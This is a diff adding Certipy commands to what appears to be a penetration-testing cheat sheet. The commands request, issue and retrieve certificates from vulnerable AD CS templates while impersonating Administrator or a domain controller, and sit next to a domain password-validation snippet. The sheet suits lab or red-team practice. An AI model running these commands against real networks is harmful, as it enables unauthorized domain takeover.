@@ -1164,3 +1164,9 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k strongPass <input.txt.enc >input.txt
 [Validate domain password with powershell]
 $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, 'range.net')
 $principalContext.ValidateCredentials('Administrator', 'Password1234')
+
+[Certipy]
+certipy req -u user@domain.local -p 'password123' -target 192.168.0.127 -ca domain-CA01-CA -template UseVuln -upn Administrator@domain.local
+certipy ca -u user@domain.local -p Password123456 -target 192.168.0.127 -ca domain-CA01-CA -issue-request 5
+certipy req -u user@domain.local -p 'password123' -target 192.168.0.127 -ca domain-CA01-CA -template UserVuln -retrieve 5
+certipy req -u escpc\$ -p Password1234 -target ca01.range.net -ca '<Enroll Services>' -template '<Template Name>' -dns 'DC01.range.net' -debug
